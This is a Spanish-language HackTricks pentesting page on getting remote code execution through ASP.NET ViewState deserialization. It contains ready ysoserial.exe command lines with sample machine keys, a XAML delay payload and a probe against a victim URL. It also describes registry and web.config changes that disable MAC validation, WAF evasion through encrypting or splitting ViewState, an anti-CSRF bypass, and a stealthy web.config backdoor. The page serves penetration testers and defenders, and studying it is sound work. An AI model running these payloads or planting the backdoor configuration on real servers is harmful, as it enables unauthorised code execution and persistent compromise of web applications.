# Introducci√≥n

Las aplicaciones web ASP.NET utilizan ViewState para mantener el estado de una p√°gina y persistir datos en un formulario web.

Normalmente es posible **ejecutar c√≥digo en un servidor web donde se puede forjar un ViewState v√°lido**. Esto se puede hacer cuando la funci√≥n de **validaci√≥n MAC** ha sido **desactivada** o conociendo:

* La **clave de validaci√≥n y su algoritmo** **previo** a la versi√≥n de .NET Framework **4.5**
* La **clave de validaci√≥n, algoritmo de validaci√≥n, clave de descifrado y algoritmo de descifrado** en .NET Framework versi√≥n 4.5 o superior

Para evitar ataques de manipulaci√≥n, .NET Framework puede **firmar y cifrar** el ViewState que ha sido serializado utilizando la clase `LosFormatter`. Luego verifica la firma utilizando el mecanismo de validaci√≥n de c√≥digo de autenticaci√≥n de mensajes (MAC). La clase `ObjectStateFormatter` realiza las tareas de firma, cifrado y verificaci√≥n. Las **claves necesarias para realizar el mecanismo de firma y/o cifrado** se pueden almacenar en la secci√≥n `machineKey` del archivo **`web.config`** (nivel de aplicaci√≥n) o **`machine.config`** (nivel de m√°quina). Esto es normalmente el caso cuando se utilizan m√∫ltiples servidores web para servir la misma aplicaci√≥n, a menudo detr√°s de un balanceador de carga en una granja web o cl√∫ster. Lo siguiente muestra el formato de la secci√≥n `machineKey` en un archivo de configuraci√≥n de una aplicaci√≥n ASP.NET que utiliza la versi√≥n 2.0 o superior de .NET Framework:
```markup
<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto | DES | 3DES | AES | alg:algorithm_name]" />
<machineKey validationKey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" decryptionKey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" validation="SHA1" decryption="AES"  />
```
Es importante tener en cuenta que cuando no se ha definido una secci√≥n `machineKey` dentro de los archivos de configuraci√≥n o cuando los atributos `validationKey` y `decryptionKey` se han establecido en `AutoGenerate`, **la aplicaci√≥n genera los valores necesarios din√°micamente** en funci√≥n de un secreto criptogr√°ficamente aleatorio. Los algoritmos tambi√©n pueden ser seleccionados autom√°ticamente. Actualmente, en la √∫ltima versi√≥n de .NET Framework, el algoritmo de validaci√≥n predeterminado es `HMACSHA256` y el algoritmo de descifrado predeterminado es `AES`. Consulte [\[13\]](https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection) para obtener m√°s detalles.

# RCE con validaci√≥n de MAC ViewState deshabilitada

En el pasado, era posible **deshabilitar la validaci√≥n de MAC** simplemente estableciendo la propiedad `enableViewStateMac` en `False`. Microsoft lanz√≥ un parche en septiembre de 2014 [\[3\]](https://devblogs.microsoft.com/aspnet/farewell-enableviewstatemac/) para hacer cumplir la validaci√≥n de MAC ignorando esta propiedad en todas las versiones de .NET Framework. Aunque algunos de nosotros podr√≠amos creer que "_ya no se puede deshabilitar el MAC ViewState_" [\[4\]](https://www.owasp.org/index.php/Anti\_CSRF\_Tokens\_ASP.NET), todav√≠a es posible deshabilitar la funci√≥n de validaci√≥n de MAC estableciendo la clave del registro `AspNetEnforceViewStateMac` en cero en:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
Alternativamente, agregar la siguiente **configuraci√≥n peligrosa** al archivo `web.config` a nivel de aplicaci√≥n tambi√©n puede deshabilitar la validaci√≥n MAC:
```markup
<configuration>
‚Ä¶
    <appSettings>
      <add key="aspnet:AllowInsecureDeserialization" value="true" />
    </appSettings>
</configuration>
```
{% hint style="danger" %}
Cuando se ha deshabilitado la validaci√≥n MAC de ViewState, se puede utilizar el proyecto [YSoSerial.Net](https://github.com/pwntester/ysoserial.net) para generar cargas √∫tiles de `LosFormatter` como ViewState para ejecutar c√≥digo arbitrario en el servidor.
{% endhint %}

Antes de la versi√≥n del Framework .NET 4.5, el par√°metro `__VIEWSTATE` pod√≠a ser encriptado mientras la funci√≥n de validaci√≥n MAC estaba deshabilitada. Se debe tener en cuenta que la mayor√≠a de los esc√°neres no intentan enviar un par√°metro ViewState sin encriptar para identificar esta vulnerabilidad. Como resultado, se requiere una prueba manual para verificar si la validaci√≥n MAC est√° deshabilitada cuando el par√°metro `__VIEWSTATE` ha sido encriptado. Esto se puede comprobar enviando una cadena aleatoria corta en base64 en el par√°metro `__VIEWSTATE`. La siguiente URL muestra un ejemplo:
```
https://victim.com/path/page.aspx?__VIEWSTATE=AAAA
```
Si la p√°gina objetivo **responde con un error, la funci√≥n de validaci√≥n MAC ha sido deshabilitada** de lo contrario habr√≠a suprimido el mensaje de error de validaci√≥n MAC. Sin embargo, en escenarios donde no se puede ver el mensaje de error, este truco no funcionar√°.

Los esc√°neres automatizados deben usar una **carga √∫til que cause un breve retraso** en el lado del servidor. Esto se puede lograr ejecutando el siguiente c√≥digo ASP.NET como ejemplo para crear un retraso de 10 segundos:
```
System.Threading.Thread.Sleep(10000);
```

```bash
string xaml_payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:System=""clr-namespace:System;assembly=mscorlib""
  xmlns:Thr=""clr-namespace:System.Threading;assembly=mscorlib"">
     <ObjectDataProvider x:Key=""x"" ObjectType = ""{ x:Type Thr:Thread}"" MethodName = ""Sleep"" >
     <ObjectDataProvider.MethodParameters>
        <System:Int32>10000</System:Int32>
     </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";
```
# RCE con validaci√≥n de MAC de ViewState habilitada

En versiones antiguas (**anteriores a 4.5**), el Framework .NET utiliza la propiedad **`TemplateSourceDirectory`** [\[15\]](https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.control.templatesourcedirectory) al **firmar** un objeto serializado. Sin embargo, desde la versi√≥n **4.5**, utiliza las cadenas de **`Purpose`** para crear el hash. Ambos mecanismos **requieren la ruta de destino desde la ra√≠z del directorio de la aplicaci√≥n** y el **nombre de la p√°gina**. Estos par√°metros se pueden **extraer de la URL**.

Las aplicaciones que utilizan un **framework antiguo** y hacen cumplir la encriptaci√≥n de ViewState a√∫n pueden **aceptar un ViewState firmado sin encriptaci√≥n**. Esto significa que **conocer la clave de validaci√≥n y su algoritmo es suficiente** para explotar un sitio web. Parece que ViewState est√° encriptado por defecto **desde la versi√≥n 4.5** incluso cuando la propiedad `viewStateEncryptionMode` se ha establecido en `Never`. Esto significa que en las √∫ltimas versiones del Framework .NET tambi√©n se requiere la **clave de descifrado y su algoritmo** para crear una carga √∫til.

El ViewState de ASP.NET contiene una propiedad llamada `ViewStateUserKey` [\[16\]](https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/ms972969\(v=msdn.10\)) que se puede utilizar para mitigar los riesgos de ataques de falsificaci√≥n de solicitudes entre sitios (CSRF) [\[4\]](https://www.owasp.org/index.php/Anti\_CSRF\_Tokens\_ASP.NET). El valor de la propiedad **`ViewStateUserKey`** (cuando no es `null`) **tambi√©n se utiliza durante el proceso de firma de ViewState**. Aunque no conocer el valor de este par√°metro puede detener nuestro ataque, **su valor a menudo se puede encontrar en las cookies o en un par√°metro de entrada oculto** ([\[17\]](https://software-security.sans.org/developer-how-to/developer-guide-csrf) muestra un ejemplo implementado).

## Plugins ViewState YSoSerial.Net

En YSoSerial.Net master y YSoSerial.Netv2 se puede encontrar un plugin ([**este**](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs) y [**este**](https://github.com/pwntester/ysoserial.net/blob/v2/ysoserial/Plugins/ViewStatePlugin.cs)) para explotar esta t√©cnica cuando se conoce toda la informaci√≥n.

### **Para .NET Framework >= 4.5:**
```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
### **Para .NET Framework <= 4.0 (legado):**

_La decryptionKey y su algoritmo no son necesarios aqu√≠:_
```bash
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
```
_Adem√°s de utilizar diferentes gadgets, es posible utilizar el par√°metro `__VIEWSTATEGENERATOR` **en lugar de proporcionar las rutas**:_
```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --generator=93D20A1B --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
Por defecto, utiliza el gadget ActivitySurrogateSelector que requiere compilar la clase ExploitClass.cs en el proyecto YSoSerial.Net. El payload de ViewState tambi√©n puede estar **encriptado** para evitar los WAFs cuando se conoce el valor de decryptionKey:
```bash
.\ysoserial.exe -p ViewState -c "foo to use ActivitySurrogateSelector" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --islegacy --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --isencrypted --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
{% hint style="info" %}
**Nota:** Debido a la naturaleza de los gadgets utilizados en YSoSerial.Net, la p√°gina ASP.NET objetivo siempre responde con un error incluso cuando se ha ejecutado con √©xito un exploit en el lado del servidor.
{% endhint %}

### Ruta de la aplicaci√≥n

Es importante encontrar la ra√≠z de la ruta de la aplicaci√≥n para crear un ViewState v√°lido a menos que:

* La aplicaci√≥n use la versi√≥n 4.0 o inferior del Framework .NET; y
* Se conozca el par√°metro `__VIEWSTATEGENERATOR`.

La siguiente captura de pantalla muestra el √°rbol de rutas en IIS:

![](https://soroush.secproject.com/downloadable/images/aspnetviewstate/iis.png)

Puede consultar [\[20\]](https://docs.microsoft.com/en-us/iis/get-started/planning-your-iis-architecture/understanding-sites-applications-and-virtual-directories-on-iis) si no est√° familiarizado con los t√©rminos de directorio virtual y aplicaci√≥n en IIS.

Para generar un ViewState para la URL anterior, los argumentos `--path` y `--apppath` deben ser los siguientes:
```
--path=/dir1/vDir1/dir2/app1/dir3/app2/vDir2/dir4
--apppath=/app2/ 
```
Si no sabemos que "app2" es el nombre de una aplicaci√≥n, podemos usar **prueba y error para probar todos los nombres de directorios** en la URL uno por uno hasta encontrar un ViewState que pueda ejecutar c√≥digo en el servidor (tal vez obteniendo una solicitud DNS o causando un retraso).

### Generador

En este caso, se puede usar el argumento `--generator`. El argumento `--isdebug` se puede usar para verificar si el complemento tambi√©n calcula el mismo par√°metro `__VIEWSTATEGENERATOR` cuando se han proporcionado los argumentos `--path` y `--apppath`.

## Explotando versiones antiguas

No se identific√≥ ning√∫n gadget para explotar .NET Framework v1.1 en el momento de escribir esta publicaci√≥n de blog.

Para explotar aplicaciones que usan .NET Framework v4.0 o inferior, se puede usar la rama YSoSerial.Net v2.0 [\[21\]](https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/tree/master/ysoserial.net-v2) (esto se desarroll√≥ originalmente como parte de otra investigaci√≥n [\[22\]](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/)). Sin embargo, este proyecto solo admite un n√∫mero limitado de gadgets y tambi√©n requiere que la m√°quina objetivo tenga instalado .NET Framework 3.5 o superior.

## **Otras herramientas**

Parece que Immunity Canvas admite la creaci√≥n del par√°metro ViewState cuando se conocen las claves de validaci√≥n y cifrado [\[29\]](https://vimeopro.com/user18478112/canvas/video/260982761). Las siguientes herramientas tambi√©n se lanzaron coincidentemente en el mismo momento en que estaba a punto de publicar mi trabajo, lo cual fue bastante sorprendente:

* [https://github.com/0xACB/viewgen](https://github.com/0xACB/viewgen) (escrito en Python)
* [https://github.com/Illuminopi/RCEvil.NET](https://github.com/Illuminopi/RCEvil.NET) (escrito en .NET)

Creo que estas herramientas actualmente **no diferencian entre diferentes versiones de .NET** Framework y apuntan a la criptograf√≠a heredada. Adem√°s, **no utilizan el par√°metro `ViewStateUserKey`** que podr√≠a estar en uso para detener los ataques CSRF.

# Consejos adicionales

## **Usando solicitudes GET**

Tambi√©n es posible enviar el par√°metro `__VIEWSTATE` en la URL a trav√©s de una solicitud GET. El √∫nico factor limitante es la longitud de la URL que limita el tipo de gadgets que se pueden usar aqu√≠.

## **Cifrado en .NET Framework anterior a la versi√≥n 4.5**

Como se mencion√≥ anteriormente, el par√°metro `__VIEWSTATE` no necesita estar cifrado al explotar .NET Framework 4.0 y versiones anteriores (probado en v2.0 a trav√©s de v4.0) incluso cuando se ha establecido la propiedad `ViewStateEncryptionMode` en `Always`. ASP.NET decide si el ViewState ha sido cifrado o no al encontrar el par√°metro `__VIEWSTATEENCRYPTED` en la solicitud (no necesita tener ning√∫n valor). Por lo tanto, es posible enviar un ViewState sin cifrar eliminando el par√°metro `__VIEWSTATEENCRYPTED` de la solicitud.

Esto tambi√©n significa que cambiar la clave de descifrado o su algoritmo no puede detener los ataques cuando se ha robado la clave de validaci√≥n y su algoritmo.

El par√°metro `__VIEWSTATE` se puede cifrar para evitar cualquier WAF.

## **Burlando el mecanismo anti-CSRF (anti-XSRF)**

Una p√°gina ASP.NET produce un error cuando se utiliza un par√°metro `__VIEWSTATE` no v√°lido. Sin embargo, la p√°gina a√∫n puede recibir sus entradas cuando se usa `Request.Form` directamente en el c√≥digo, por ejemplo, usando `Request.Form["txtMyInput"]` en lugar de `txtMyInput.Text`. **El ataque CSRF se puede lograr eliminando el par√°metro `__VIEWSTATE` de la solicitud o agregando el par√°metro `__PREVIOUSPAGE` con un valor no v√°lido**. Como el par√°metro `__PREVIOUSPAGE` se cifra y se formatea en base64 de forma predeterminada, incluso proporcionar un solo car√°cter como su valor deber√≠a causar un error.

Esto podr√≠a resultar en la omisi√≥n del mecanismo de protecci√≥n anti-CSRF que se ha implementado estableciendo el par√°metro `Page.ViewStateUserKey`.

## **Uso del par√°metro ViewStateGenerator**

Cuando se conoce el par√°metro `__VIEWSTATEGENERATOR`, se puede usar para las aplicaciones ASP.NET que usan la versi√≥n 4.0 o inferior de .NET Framework para firmar un objeto serializado sin conocer la ruta de la aplicaci√≥n.

## **Fragmentaci√≥n de ViewState para burlar WAFs**

Es posible dividir el par√°metro `__VIEWSTATE` en varias partes cuando se ha establecido la propiedad **`MaxPageStateFieldLength`** en un valor **positivo**. Su valor **predeterminado** es **negativo** y significa que el par√°metro **`__VIEWSTATE`** no se puede dividir en varias partes.

Esto podr√≠a ser √∫til para burlar algunos WAFs cuando se permite la fragmentaci√≥n de ViewState.

## **Explotando el par√°metro EventValidation**

El par√°metro `__EVENTVALIDATION` y algunos otros par√°metros tambi√©n se serializan de manera similar al par√°metro `__VIEWSTATE` y se pueden dirigir de manera similar. Explotar un problema de deserializaci√≥n a trav√©s de `__EVENTVALIDATION` es m√°s restrictivo y requiere:

* Una solicitud POST
* Una p√°gina ASP.NET que acepte par√°metros de entrada
* Un nombre de par√°metro de entrada v√°lido. Por ejemplo, el par√°metro `myinput` en la solicitud POST cuando tenemos el siguiente c√≥digo en el lado del servidor:
```markup
<asp:TextBox runat="server" ID="myinput" />
```
El valor del par√°metro `__VIEWSTATE` puede estar vac√≠o en la solicitud al explotar el par√°metro `__EVENTVALIDATION`, pero debe existir.

La cadena `Purpose` que utiliza .NET Framework 4.5 y superior para crear una firma v√°lida es diferente seg√∫n el par√°metro utilizado. La siguiente tabla muestra las cadenas `Purpose` definidas en .NET Framework:

| **Par√°metro de entrada**                                     | **Cadena Purpose**                                 |
| ------------------------------------------------------------ | -------------------------------------------------- |
| ‚Äú\_\_VIEWSTATE‚Äù                                              | WebForms.HiddenFieldPageStatePersister.ClientState |
| ‚Äú\_\_EVENTVALIDATION‚Äù                                        | WebForms.ClientScriptManager.EventValidation       |
| P2 en P1\|P2 en ‚Äú\_\_dv‚Äù + ClientID + ‚Äú\_\_hidden‚Äù           | WebForms.DetailsView.KeyTable                      |
| P4 en P1\|P2\|P3\|P4 en ‚Äú\_\_CALLBACKPARAM‚Äù                  | WebForms.DetailsView.KeyTable                      |
| P3 en P1\|P2\|P3\|P4 en ‚Äú\_\_gv‚Äù + ClientID + ‚Äú\_\_hidden‚Äù   | WebForms.GridView.SortExpression                   |
| P4 en P1\|P2\|P3\|P4 en ‚Äú\_\_gv‚Äù + ClientID + ‚Äú\_\_hidden‚Äù   | WebForms.GridView.DataKeys                         |

La tabla anterior muestra todos los par√°metros de entrada que podr√≠an ser objetivo.

## **Cuidado con el par√°metro PreviousPage**

Cuando el par√°metro **`__PREVIOUSPAGE`** existe en la solicitud con datos **inv√°lidos**, la **aplicaci√≥n** **no** **deserializa** el par√°metro **`__VIEWSTATE`**. Proporcionar el par√°metro `__CALLBACKID` evita este comportamiento.

## **Fiabilidad de errores**

Como se explic√≥ anteriormente, a veces usamos errores para comprobar si un ViewState generado es v√°lido. ASP.NET no muestra el error de validaci√≥n MAC por defecto cuando se utiliza un par√°metro `__VIEWSTATEGENERATOR` inv√°lido. Este comportamiento cambia cuando se utiliza la propiedad `ViewStateUserKey`, ya que ASP.NET ya no suprime los errores de validaci√≥n MAC.

Adem√°s de esto, las aplicaciones web de ASP.NET pueden ignorar los errores de validaci√≥n MAC con la siguiente configuraci√≥n incluso cuando se utiliza la propiedad `ViewStateUserKey`:
```markup
<appSettings>
      <add key="aspnet:AlwaysIgnoreViewStateValidationErrors" value="true" />
</appSettings>
```
# Web.config como puerta trasera

Si los atacantes pueden **cambiar** el archivo **`web.config`** en la ra√≠z de una aplicaci√≥n, pueden **ejecutar c√≥digo f√°cilmente** en el servidor. Sin embargo, incrustar una puerta trasera sigilosa en la aplicaci√≥n podr√≠a ser una buena opci√≥n para un atacante. Esto se puede hacer **desactivando la validaci√≥n MAC** y estableciendo la propiedad `viewStateEncryptionMode` en `Always`. Esto significa que todas las p√°ginas ASP.NET que no establezcan la propiedad `ViewStateEncryptionMode` en `Auto` o `Never` siempre usan par√°metros de ViewState cifrados. Sin embargo, como **ViewState no utiliza la funci√≥n de validaci√≥n MAC, ahora son vulnerables a la ejecuci√≥n remota de c√≥digo a trav√©s de la deserializaci√≥n de datos no confiables**. Lo siguiente muestra un ejemplo:
```markup
<configuration>
‚Ä¶
    <system.web>
‚Ä¶
        <pages enableViewStateMac="false" viewStateEncryptionMode="Always" />
    </system.web>
    <appSettings>
        <add key="aspnet:AllowInsecureDeserialization" value="false" />
    </appSettings>
</configuration>
```
¬°Otra opci√≥n para un sitio web independiente ser√≠a establecer la secci√≥n `machineKey` con claves y algoritmos arbitrarios para detener a otros atacantes!

Cabe se√±alar que establecer la propiedad `EnableViewState` en `False` no detiene este ataque ya que el ViewState seguir√° siendo analizado por ASP.NET.


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
